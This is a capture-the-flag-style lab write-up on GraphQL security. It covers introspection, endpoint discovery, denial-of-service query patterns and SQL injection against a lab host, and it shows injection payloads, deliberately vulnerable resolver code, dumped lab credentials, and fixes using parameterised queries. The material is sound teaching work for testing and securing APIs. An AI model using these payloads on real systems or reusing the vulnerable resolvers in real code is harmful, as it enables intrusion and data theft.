# Intro to GraphQL Hacking

<img width="1902" height="378" alt="image" src="https://github.com/user-attachments/assets/469a3bea-0b10-408e-b7eb-98f8d7b5cc13" />


---

<details>
  <summary>Understanding GraphQL</summary>


# GraphQL vs. REST API

GraphQL lets clients have control over the data they request. This is different from traditional REST APIs, where you’re stuck with what the server gives you. In GraphQL, you can ask for specific fields, saving bandwidth and making your requests more efficient.

For example, with REST APIs, fetching a user's details and their associated posts might need two separate calls—one for user info and another for posts. With GraphQL, you can get all of this in one query, making it much faster and easier to manage.

## Feature Comparison

| Feature | GraphQL | REST API |
|---------|---------|----------|
| Endpoint | Single endpoint (`/graphql`) | Multiple endpoints (`/users`, `/posts`) |
| Data Fetching | Customisable; clients choose fields | Fixed; clients get all data sent |
| Over-fetching/Under-fetching | Prevented through precise queries | Common due to pre-defined responses |
| Schema | Strongly typed and self-documented | Based on external docs or conventions |
| Batch Requests | Single request for related data | Multiple API calls needed |

With GraphQL, you avoid over-fetching (getting unnecessary data) and under-fetching (not getting enough data). This makes it ideal for modern applications where efficiency is key.

## Queries vs Mutations

GraphQL has two main types of operations: **queries** and **mutations**.

- **Queries** are used to read data, similar to GET requests in REST. They don’t modify anything on the server.
- **Mutations** are for making changes, like creating, updating, or deleting records. They’re similar to POST, PUT, or DELETE requests in REST.

### Query Example

Here’s a simple example of a query: the query is querying the user with ID `123` as the input parameter and expecting the `email` and `name` as the output:

```graphql
{
  user(id: "123") {
    name
    email
  }
}
```

And the response might look like:

```json
{
  "data": {
    "user": {
      "name": "John Doe",
      "email": "john@example.com"
    }
  }
}
```

### Mutation Example

For a mutation, let’s say we want to update the user's name:

```graphql
mutation {
  updateUser(id: "123", name: "Jane Doe") {
    id
    name
  }
}
```

The server would respond with:

```json
{
  "data": {
    "updateUser": {
      "id": "123",
      "name": "Jane Doe"
    }
  }
}
```

This clear distinction between queries and mutations helps keep things organised and predictable.

## Nested Queries and Fragments

One of GraphQL’s strengths is the ability to handle nested queries and fragments.

### Nested Queries

Nested queries let you fetch related data in one go. For instance, if you want a user’s details, their posts, and the comments on those posts, you can do it all in one query:

```graphql
{
  user(id: "123") {
    name
    posts {
      title
      comments {
        text
        author {
          name
        }
      }
    }
  }
}
```

The server would respond with:

```json
{
  "data": {
    "user": {
      "name": "John Doe",
      "posts": [
        {
          "title": "GraphQL Basics",
          "comments": [
            {
              "text": "Great article!",
              "author": {
                "name": "Jane Doe"
              }
            }
          ]
        },
        {
          "title": "Advanced GraphQL Techniques",
          "comments": [
            {
              "text": "Very informative!",
              "author": {
                "name": "Bob Smith"
              }
            }
          ]
        }
      ]
    }
  }
}
```

This approach reduces the number of requests, which is a big deal when you’re working with APIs that handle a lot of related data.

### Fragments

Fragments let you reuse parts of a query, making your code cleaner and easier to maintain. For example:

```graphql
fragment UserDetails on User {
  name
  email
}

{
  user(id: "123") {
    ...UserDetails
    posts {
      title
    }
  }
}
```

Instead of writing `name` and `email` repeatedly, you define a fragment and use it wherever you need.

## Key Takeaway

GraphQL’s flexibility in querying makes it incredibly powerful, but it also introduces risks if implemented poorly. You now know how to differentiate queries from mutations and how to use nested queries and fragments effectively. This knowledge will be the foundation for exploiting and securing GraphQL APIs.





  
</details>





<details>
  <summary>Searching for GraphQL Endpoints</summary>


# Discovering a GraphQL Endpoint

Discovering a GraphQL endpoint is the first and most critical step in interacting with a GraphQL API. Unlike REST APIs, which typically have multiple endpoints for different resources, GraphQL APIs often rely on a single endpoint for all queries and mutations.

Identifying the GraphQL endpoint allows attackers to automate the schema enumeration, craft custom queries, and potentially exploit vulnerabilities.

## Methods to Identify GraphQL Endpoints

### 1. Inspecting Network Traffic

The quickest way to identify a GraphQL endpoint is by inspecting the traffic generated when interacting with a web application.

For example, navigate to `http://graphql.thm/labs/lab1` and perform actions like logging in. Once done, open the browser's developer tools (`F12`) and click on the **Network** tab.

Look for `POST` or `GET` requests with a payload containing terms like `query` or `mutation`. These are clear indicators of GraphQL requests.


<img width="1542" height="696" alt="image" src="https://github.com/user-attachments/assets/bc27191d-9118-493c-bae6-21e994e377b5" />



> **GraphQL query in the request tab of the XHR request**




### 2. Searching JavaScript Files

Frontend code often references the GraphQL endpoint in JavaScript files. This is especially common in modern single-page applications (SPAs).

For example, use the **Sources** or **Debugger** tab in the browser’s developer tools to view loaded JavaScript files.

> **Loaded JavaScript files in the browser's debugger**


<img width="1383" height="812" alt="image" src="https://github.com/user-attachments/assets/2b633f78-ee85-41c1-b9af-88a25c25ff81" />

Search for keywords like `graphql`, `/graphql`, or `mutation` to locate the endpoint.



<img width="1390" height="801" alt="image" src="https://github.com/user-attachments/assets/be381241-ef87-4834-b703-c631796817c0" />


> **Hardcoded endpoint in the JavaScript file**

### 3. Testing Common Endpoint Names

Developers often use predictable naming conventions for GraphQL endpoints. If you don’t see any obvious requests, manually test common endpoint names:

- `/graphql`
- `/api/graphql`
- `/v1/graphql`
- `/gql`

Use tools like **Postman**, **cURL**, **Burp Suite**, or your browser to send basic queries to these endpoints and observe the responses.

> **Default GraphQL interface not disabled**

Additionally, a wordlist like [`graphql.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt) from SecLists can be used with fuzzing tools like `wfuzz`.

### 4. Triggering Error Messages

If the endpoint is not immediately visible, deliberately submitting invalid requests can reveal useful error messages. For example, sending an empty `POST` request to `/graphql` without any payload will make the server respond with the below error message:

```
curl -X POST http://graphql.thm:8ø8ø/graphq1
```

> **Error message triggered using terminal**

<img width="1236" height="93" alt="image" src="https://github.com/user-attachments/assets/579a4365-a40a-4a73-916f-be10c21a1d48" />

  
</details>





<details>
   <summary>Common GraphQL Vulnerabilities</summary>


# GraphQL Security Risks

GraphQL is a powerful tool for creating flexible APIs, but it also introduces unique risks that can lead to serious security issues if not properly mitigated.

## Excessive Data Exposure

GraphQL lets clients define the structure of their responses, which is great for flexibility but can lead to exposing sensitive data if access controls are weak or nonexistent. Unlike REST APIs, where the server dictates the structure of responses, GraphQL allows the client to request any field defined in the schema—even fields that shouldn't be publicly accessible.

Here's an example of how this can happen. Imagine a GraphQL API with a user type that has fields like `id`, `name`, `email`, `password`, and `apiKey`. If access controls aren't properly configured, an attacker could send the following query:

```graphql
{
  user(id: "1") {
    id
    username
    email
    password
    is_admin
  }
}
```

Without restrictions, the server might respond with sensitive information:

```json
{
  "data": {
    "user": {
      "id": "1",
      "username": "user",
      "email": "user@graphql.thm",
      "password": "user",
      "is_admin": false
    }
  }
}
```

This is a classic case of **excessive data exposure**. Attackers can use this information to compromise accounts, escalate privileges, or perform further attacks.

## Injection Attacks

Injection attacks happen when user-supplied input is embedded into backend operations like SQL queries, NoSQL operations, or system commands without proper validation. In GraphQL, these attacks are typically carried out by sending crafted queries to exploit vulnerabilities in the server's resolvers.

Take the following resolver as an example:

```javascript
const resolvers = {
  Query: {
    user: (_, { id }) => database.query(`SELECT * FROM users WHERE id = ${id}`)
  }
};
```

If an attacker sends the following query:

```graphql
{
  user(id: "1; DROP TABLE users; --") {
    name
  }
}
```

The resolver's dynamic query would execute:

```sql
SELECT * FROM users WHERE id = 1; DROP TABLE users; --;
```

This could result in catastrophic database damage.

## Denial of Service (DoS) Through Complex Queries

GraphQL's ability to handle nested and complex queries is one of its greatest strengths, but it can also be a liability. Attackers can exploit this feature by crafting queries that consume excessive server resources, leading to degraded performance or even downtime.

### Deeply Nested Queries

For example, an attacker could send a deeply nested query like this:

```graphql
{
  user(id: "123") {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}
```

This query forces the server to traverse multiple layers of relationships, consuming memory and CPU cycles.

### Large Batched Queries

Another technique involves large batched queries:

```graphql
{
  user1: user(id: "1") { name }
  user2: user(id: "2") { name }
  user3: user(id: "3") { name }
  # Repeat for hundreds or thousands of users
}
```



  
</details>





<details>
  <summary>Understanding Introspection</summary>


# What is GraphQL Introspection?

GraphQL introspection is a feature that allows clients to query the schema itself. This means you can retrieve detailed information about all the types, fields, and relationships defined in the API. Introspection is an incredibly useful tool for developers because it enables them to explore an API's capabilities without needing external documentation.

For example, a query to retrieve schema information might look like this:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

This query asks the API to return a list of all the types it supports and their fields. The response provides a complete map of how the API is structured, making it easier to build queries and mutations.

## Why is Introspection Useful?

- **Development Efficiency:** Developers can quickly understand the API's structure and available operations without searching through documentation.
- **Auto-Generated Tools:** Tools like [GraphiQL](https://github.com/graphql/graphiql) and Postman leverage introspection to provide autocomplete suggestions and visualise schemas dynamically.
- **Self-Documenting APIs:** APIs with introspection don't require separate documentation since the schema itself serves as the documentation.

## The Role of Introspection in Schema Discovery

Introspection is often the first step in assessing a GraphQL API's security because it reveals the schema. Once an attacker has access to the schema, they can identify sensitive fields, potential vulnerabilities, and opportunities for exploitation. For example:

- **Identifying Sensitive Fields:** Fields like `password`, `apiKey`, or `ssn` become obvious targets once exposed in the schema.
- **Mapping Relationships:** Nested types and relationships between objects can reveal additional attack surfaces.
- **Locating Hidden Operations:** Admin-only mutations or deprecated fields can be uncovered.

## Security Risks of Exposing Introspection in Production

While introspection is invaluable during development, leaving it enabled in production environments can expose your API to significant risks:

- **Schema Enumeration:** Attackers can retrieve a full list of types, queries, mutations, and fields. This information enables precise and targeted attacks.
- **Sensitive Data Exposure:** Even if fields like `password` or `token` are restricted, their presence in the schema might indicate misconfigured access controls.
- **Reconnaissance for Exploitation:** Knowing the schema allows attackers to craft complex queries to exploit vulnerabilities such as excessive data exposure or denial of service.
- **Hidden Functionality:** Deprecated or internal operations that should remain unseen may still be exposed through introspection.

## Best Practices to Mitigate Risks

- **Disable Introspection in Production:** Configure the GraphQL server to disable introspection queries when deployed to production.
- **Role-Based Access Control:** Allow introspection only for authorised roles, such as admin or developer accounts.
- **Custom Error Responses:** Ensure the API doesn't reveal excessive information in error messages.

## Exercise

1. Navigate to `http://graphql.thm/labs/lab1/`

2. Go to the vulnerable application

3. Log in to the application using the credentials below:

| Username | Password |
|----------|----------|
| user     | password |

> **Note:** Make sure to proxy the traffic before clicking the login button. If you're using the AttackBox, you can use Burp Suite Proxy.

4. Upon clicking the login button, you will notice that the application sends a POST traffic to the `/graphql` endpoint of the application.


<img width="1491" height="612" alt="image" src="https://github.com/user-attachments/assets/d9954ffd-3457-4db7-8941-256b4a715a3b" />



> **Capture the HTTP request**

5. Send the request to the repeater and change the value of the `query` parameter to the below request:

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      args { ...InputValue }
      locations
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

> **Modify the request body to the introspection query**

<img width="1503" height="605" alt="image" src="https://github.com/user-attachments/assets/daf63f8b-1689-4211-b903-b76fd89f8554" />





6. As you can see in the image above, the application response contains the entire web application schema. Using this schema, we can map out the GraphQL structure of the application using [GraphQL Voyager](https://graphql-voyager.vercel.app/).

7. Copy the response of the vulnerable web application to the GraphQL Voyager web app by following the steps below:

> **Note:** Remove the HTTP headers in response first before clicking the display button.

<img width="1896" height="716" alt="image" src="https://github.com/user-attachments/assets/4bd5eecd-c18f-4df3-b62f-cd6fdcbda6fe" />



> **Load the GraphQL response in GraphQL Voyager**

8. GraphQL Voyager will display the queries available.

> **Entire GraphQL schema loaded in GraphQL Voyager**

---

> ## now to get email of user **`bob`**

```graphql
{
    users {
            id
            username
            email
            is_admin
        }
    }
```


<img width="1575" height="561" alt="image" src="https://github.com/user-attachments/assets/0ad006df-c831-4e18-94b4-5093fbeb2d7a" />

```json
{"data":{"users":[{"id":"1","username":"user","password":"password","email":"user@graphql.thm","is_admin":false},{"id":"2","username":"bob","password":"password456","email":"bob@graphql.thm","is_admin":true},{"id":"3","username":"charlie","password":"password789","email":"charlie@graphql.thm","is_admin":false},{"id":"4","username":"diana","password":"mypassword","email":"diana@graphql.thm","is_admin":true},{"id":"5","username":"flag","password":"GRAPHQL{sQl_1Nj3cti0n}","email":"flag@graphql.thm","is_admin":false}]}}
```


  
</details>







<details>
  <summary>GraphQL SQL Injection</summary>


# What is GraphQL SQL Injection?

GraphQL SQL Injection occurs when user inputs in a GraphQL query are improperly sanitised and passed directly into database operations. This vulnerability allows attackers to inject malicious SQL commands into GraphQL queries, potentially compromising the entire database.

## Vulnerable Code Example

For example, the vulnerable application uses the below code when a user logs in to the application:

```javascript
const resolvers = {
  Query: {
    users: async (_, { username }) => {
      const connection = await mysql.createConnection(dbConfig);
      const query = username
        ? `SELECT * FROM users WHERE username = '${username}'`
        : `SELECT * FROM users`;
      const [rows] = await connection.query(query);
      await connection.end();
      return rows;
    },
  }
};
```

## Attack Example

If an attacker sends a malicious input, such as:

```json
{
  "query": "\n                query ($username: String!) {\n                    users(username: $username) {\n                        id\n                        username\n                        password\n                    }\n                }\n            ",
  "variables": {
    "username": "admin' OR '1'='1"
  }
}
```

The server will execute the following SQL query:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

This bypasses constraints and retrieves all rows from the `users` table.



## Exercise

### Step 1: Navigate to the Vulnerable Application

Go to `http://graphql.thm/labs/lab2/`

> **Go to the vulnerable application**

### Step 2: Configure Proxy

> **Note:** Proxy the traffic through Burp Suite or any other proxy tool. If you're using the AttackBox, make sure Burp Suite Proxy is configured.

### Step 3: Attempt Login

Try logging in to the application using any credential.

> **Login using random credentials**

### Step 4: Capture the Request

The application sends a `POST` request to the `/graphql` endpoint.

> **Capture the HTTP request generated by the login**

This contains a query to fetch user details. Send the request to the **Repeater** tab in Burp Suite and modify the `username` parameter to test for SQL injection:

```json
{
  "username": "test'"
}
```

> **Modify the value of the username parameter to include a SQLi payload**

### Step 5: Craft the Malicious Payload

Craft a payload to disclose the `users` table:

```json
{
  "username": "test' OR '1'='1"
}
```

### Step 6: Observe the Response

The response from the server will include sensitive details, such as usernames and passwords, from the `users` table.

<img width="1565" height="568" alt="image" src="https://github.com/user-attachments/assets/f68bc8d0-1368-416e-8ef4-659ba319d0dd" />


> **The server response reveals sensitive data**





  
</details>




<details>
  <summary>Securing GraphQL</summary>


# Securing GraphQL APIs: Best Practices

## Disable Introspection in Production

When you're building a GraphQL API, introspection is great for development. It helps developers explore the API schema without needing extra documentation. But in production, it's a security risk. If attackers can query the schema, they'll know exactly what data is available, how to access it, and potentially find sensitive fields or hidden operations.

### How to Turn It Off

Most GraphQL libraries let you disable introspection pretty easily. Here's how you can do it in Apollo Server:

```javascript
const { ApolloServer } = require('apollo-server');

const server = new ApolloServer({
  schema,
  introspection: false // Turns introspection off
});
```

This makes sure no one can query the schema directly in production. If you still need introspection for specific users (like developers), you can create access rules to allow it only for authorised roles.

## Limit Query Depth and Complexity

GraphQL lets you fetch nested and complex data in a single query, which is one of its best features. But attackers can abuse this by creating deeply nested or overly complex queries to overload your server.

### How to Stop This

You can limit how "deep" queries can go and how "complex" they are.

#### Limiting Query Depth

For depth, you just set a maximum level of nesting:

```javascript
const { depthLimit } = require('graphql-depth-limit');

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(5)] // Stops queries deeper than 5 levels
});
```

#### Limiting Query Complexity

For complexity, you assign a "score" to each field and set a maximum score for any query:

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const complexityRule = createComplexityLimitRule(1000); // Stops queries with a score over 1000

const server = new ApolloServer({
  schema,
  validationRules: [complexityRule],
});
```

Adding these limits makes it much harder for attackers to crash your server with huge queries.

## Use Parameterised Queries for Inputs

GraphQL queries usually include user inputs, like IDs or filters. If these inputs go straight into your database queries without checks, attackers could inject malicious SQL commands. This is where parameterised queries come in.

### What Are Parameterised Queries?

Instead of inserting user inputs directly into your SQL, you use placeholders like `?`. The database treats inputs as values, not code, so even if someone tries to inject malicious SQL, it won't run.

### Example

Here's how you can safely fetch users with an optional username filter:

```javascript
const resolvers = {
  Query: {
    users: async (_, { username }) => {
      const connection = await mysql.createConnection(dbConfig);

      const query = username
        ? `SELECT * FROM users WHERE username = ?`
        : `SELECT * FROM users`;

      const [rows] = await connection.execute(query, username ? [username] : []);

      await connection.end();
      return rows;
    },
  },
};
```

**What's happening here:**

- The `?` acts as a placeholder for user input.
- `connection.execute()` automatically sanitises the input.
- If `username` isn't provided, the query defaults to fetching all users.

## Keep It Simple

To secure your GraphQL API:

1. **Turn off introspection in production**, or restrict it to trusted users.
2. **Limit how deep or complex queries can get** to stop attacks that overload your server.
3. **Always use parameterised queries** for database inputs—never trust raw user data.

These steps help you stay safe without making your API overly complicated to use or maintain.



  
</details>










































































